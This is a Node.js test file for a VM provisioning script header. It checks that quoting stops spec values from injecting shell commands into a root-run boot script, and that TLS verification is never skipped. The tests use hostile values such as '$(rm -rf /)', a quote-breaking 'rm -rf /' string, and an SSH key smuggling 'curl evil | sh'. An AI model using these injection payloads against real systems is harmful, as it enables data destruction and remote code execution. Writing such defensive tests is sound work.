const { test } = require('node:test');
const assert = require('node:assert');
const { execFileSync } = require('node:child_process');

const header = require('../../src/app/vms/provision/header');
const { q } = require('../../src/app/vms/provision/header');

//---------------------------------------------------------------------------
//the block of values every script is given.
//
//THE CLAIM WORTH THE MOST: every value is quoted so it cannot end the string it
//is in. A spec is configuration somebody types, and it ends up in a shell file
//that runs AS ROOT at first boot — so a name, a password or an ssh key carrying
//a quote is the difference between a value and a command.
//
//AND THE SECOND: it is PREPENDED, never substituted. Each script file stays
//valid shell on its own, so it can be read, edited and run by hand on the
//machine where the problem is.
//---------------------------------------------------------------------------

const where = {
    hostAddress: '192.168.51.63',
    port: 7443,
    channelPort: 7374,
    caPort: 7375,
    caFingerprint: 'ab:cd:ef'
};

const vmWith = (spec) => ({ name: 'runner1', spec: Object.assign({ token: 'a-token' }, spec) });

//WHAT BASH ACTUALLY MAKES OF IT, rather than what a regular expression thinks.
//Git ships one on Windows, so this runs where the dashboard is developed.
const bashSays = (script, name) => {
    try {
        return String(execFileSync('bash', ['-c', script + '\nprintf "%s" "$' + name + '"'],
            { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }));
    } catch (e) {
        return { failed: e };
    }
};

//---- the quoting ------------------------------------------------------------

test('a value with no quotes in it comes back exactly', () => {
    assert.equal(q('okc'), "'okc'");
    assert.equal(q(''), "''");
    assert.equal(q(null), "''");
    assert.equal(q(undefined), "''");
    assert.equal(q(7374), "'7374'");
});

test('a single quote is closed, escaped, and reopened, which is the only way', () => {
    //SHELL GIVES NO WAY TO ESCAPE A QUOTE INSIDE SINGLE QUOTES, so the value has
    //to leave the string and come back.
    assert.equal(q("it's"), "'it'\\''s'");
});

test('everything else is already inert inside single quotes', () => {
    //BACKTICKS, $(), $VAR, NEWLINES, SEMICOLONS — this is why single quotes are
    //the whole of the defence rather than the first layer of it.
    for (const nasty of ['$(rm -rf /)', '`id`', '$HOME', 'a;b', 'a\nb', 'a && b', '"double"', '\\']) {
        assert.equal(q(nasty), "'" + nasty + "'", nasty);
    }
});

test('bash reads back exactly what was put in, quote and all', () => {
    //THE ONE THAT MATTERS, ASKED OF BASH RATHER THAN OF A REGEX.
    for (const nasty of [
        "it's",
        "'; rm -rf /; echo '",
        '$(id)',
        '`id`',
        'a"b',
        "'''",
        '\\'
    ]) {
        const said = bashSays('V=' + q(nasty), 'V');
        if (said && said.failed) {
            //No bash on this host — the checks above still hold the shape.
            return;
        }
        assert.equal(said, nasty, JSON.stringify(nasty));
    }
});

test('a machine name carrying a quote does not become a command', () => {
    const vm = { name: "runner'; rm -rf /; '1", spec: { token: 'a-token' } };
    const said = bashSays(header(vm, where), 'OKC_VM');

    if (said && said.failed) return;
    assert.equal(said, "runner'; rm -rf /; '1");
});

test('and neither does an ssh key or a password', () => {
    const vm = vmWith({ sshKey: "ssh-ed25519 AAAA'; curl evil | sh; '", user: "o'kc" });

    const key = bashSays(header(vm, where), 'OKC_SSH_KEY');
    const user = bashSays(header(vm, where), 'OKC_USER');
    if ((key && key.failed) || (user && user.failed)) return;

    assert.equal(key, "ssh-ed25519 AAAA'; curl evil | sh; '");
    assert.equal(user, "o'kc");
});

//---- what a machine is told about itself ------------------------------------

test('the token is carried, and it is the machine’s own', () => {
    //IT CAN ONLY EVER CONNECT AS ITSELF, because the dashboard checks this
    //against the machine it claims to be.
    assert.match(header(vmWith({ token: 'the-secret' }), where), /^OKC_TOKEN='the-secret'$/m);
});

test('a desktop is yes unless the machine was built without one', () => {
    //MISSING MEANS YES, deliberately: every machine made before the flag existed
    //was installed from a desktop image and has one.
    assert.match(header(vmWith({ desktop: false }), where), /^OKC_DESKTOP='no'$/m);
    assert.match(header(vmWith({ desktop: true }), where), /^OKC_DESKTOP='yes'$/m);
    assert.match(header(vmWith({}), where), /^OKC_DESKTOP='yes'$/m);
});

test('a supervisor is no unless it was built as one', () => {
    //THE OTHER WAY ROUND FROM THE DESKTOP, and on purpose: an unlabelled machine
    //is a runner, and the wrong answer here is the one that gives a machine the
    //app's own provisioning and a sign-in desk.
    assert.match(header(vmWith({ supervisor: true }), where), /^OKC_SUPERVISOR='yes'$/m);
    assert.match(header(vmWith({}), where), /^OKC_SUPERVISOR='no'$/m);
    assert.match(header(vmWith({ supervisor: 'yes' }), where), /^OKC_SUPERVISOR='no'$/m);
});

test('where this host is, and how to reach it, come from the network half', () => {
    const said = header(vmWith({}), where);

    assert.match(said, /^OKC_HOST='192\.168\.51\.63'$/m);
    assert.match(said, /^OKC_BASE='https:\/\/192\.168\.51\.63:7443'$/m);
    assert.match(said, /^OKC_CHANNEL_PORT='7374'$/m);
    //A GUEST CANNOT USE 127.0.0.1 TO REACH THE HOST — the address is answered in
    //../vbox/network.js and passed in, never guessed here.
    assert.equal(said.includes('127.0.0.1'), false);
});

test('everything a script needs is exported, or a child stage would not see it', () => {
    const said = header(vmWith({}), where);
    const exported = said.split('\n').filter((l) => l.startsWith('export ')).join(' ');

    for (const name of ['OKC_VM', 'OKC_TOKEN', 'OKC_CA', 'OKC_CA_FINGERPRINT', 'OKC_BASE',
        'OKC_DESKTOP', 'OKC_SUPERVISOR', 'OKC_CHANNEL_PORT']) {
        assert.ok(exported.includes(name), name + ' is not exported');
    }
});

//---- what proves the dashboard is the dashboard -----------------------------

test('the authority is fetched over plain http and checked against a fingerprint', () => {
    const said = header(vmWith({}), where);

    //THE CERTIFICATE IS PUBLIC AND ITS ADDRESS IS UNENCRYPTED; the fingerprint
    //is what makes fetching it from there safe.
    assert.match(said, /^OKC_CA_URL='http:\/\/192\.168\.51\.63:7375\/ca\.pem'$/m);
    assert.match(said, /^OKC_CA_FINGERPRINT='ab:cd:ef'$/m);

    //AND THE REFUSAL IS GUARDED BY THE COMPARISON, not merely present in the
    //text. Asserting the message alone passed with the `if` turned into `if
    //false` — a header that prints a refusal it can never reach reads exactly
    //like one that checks.
    const lines = said.split('\n').map((l) => l.trim());
    const guard = lines.indexOf('if [ "$got" != "$want" ]; then');
    assert.ok(guard > 0, 'the fingerprints are never compared');

    //WHAT IS INSIDE IT: say so, throw the file away, and fail.
    const block = lines.slice(guard, lines.indexOf('fi', guard));
    assert.ok(block.some((l) => /REFUSED the certificate authority/.test(l)), block.join(' | '));
    assert.ok(block.some((l) => /^rm -f "\$tmp"$/.test(l)), block.join(' | '));
    assert.ok(block.some((l) => /^return 1$/.test(l)), block.join(' | '));

    //AND THE ONE THING IT MUST NOT DO: install what it just refused.
    assert.equal(block.some((l) => /mv "\$tmp"/.test(l)), false, block.join(' | '));
});

test('nothing anywhere is told to skip verification', () => {
    const said = header(vmWith({}), where);

    //THAT WOULD HAVE BEEN THE EASY WAY to make a self-signed certificate work,
    //and it would have thrown away the entire reason for having one.
    assert.equal(/-k\b|--insecure|GIT_SSL_NO_VERIFY|NODE_TLS_REJECT_UNAUTHORIZED/.test(said), false);
    //AND EVERY CALL PASSES THE AUTHORITY.
    said.split('\n').filter((l) => l.includes('curl') && l.includes('$OKC_BASE')).forEach((l) => {
        assert.ok(l.includes('--cacert "$OKC_CA"'), l);
    });
});

//---- the log says it once ---------------------------------------------------

test('a stage started from a stage writes through its parent rather than teeing again', () => {
    const said = header(vmWith({}), where);

    //EVERY LINE APPEARED TWICE, for a whole run, and nothing was wrong. That is
    //the kind of noise that makes a log stop being read.
    assert.match(said, /if \[ "\$\{OKC_TEEING:-no\}" != yes \]; then/);
    assert.match(said, /export OKC_TEEING OKC_LOG/);
});

test('the header is only a header, so the script below it stays runnable by hand', () => {
    const said = header(vmWith({}), where);

    //IT DEFINES THINGS AND CALLS NOTHING THAT DOES WORK. A script full of
    //${placeholders} is a script nobody can run where the problem is.
    assert.ok(said.startsWith('#!/bin/bash\n'));
    assert.ok(said.endsWith('\n'));
    assert.equal(/^(apt|systemctl|reboot|rm |curl -fsS "\$OKC_BASE\/provision\/(?!report|say))/m.test(said), false);
});

test('the whole block is valid shell', () => {
    //THE CHEAPEST CHECK THERE IS, and it catches the failure this file is most
    //likely to have: an unterminated string from a value that got away.
    try {
        execFileSync('bash', ['-n'], { input: header(vmWith({}), where), stdio: ['pipe', 'ignore', 'pipe'] });
    } catch (e) {
        if (e.code === 'ENOENT') return;   //no bash on this host
        assert.fail('bash -n refused the header: ' + String(e.stderr || e.message));
    }
});

test('and it is still valid shell with a value doing its worst', () => {
    const vm = {
        name: "r'1",
        spec: { token: "'; id; '", sshKey: 'a\nb', user: '$(whoami)', password: '`id`' }
    };
    try {
        execFileSync('bash', ['-n'], { input: header(vm, where), stdio: ['pipe', 'ignore', 'pipe'] });
    } catch (e) {
        if (e.code === 'ENOENT') return;
        assert.fail('bash -n refused the header: ' + String(e.stderr || e.message));
    }
});
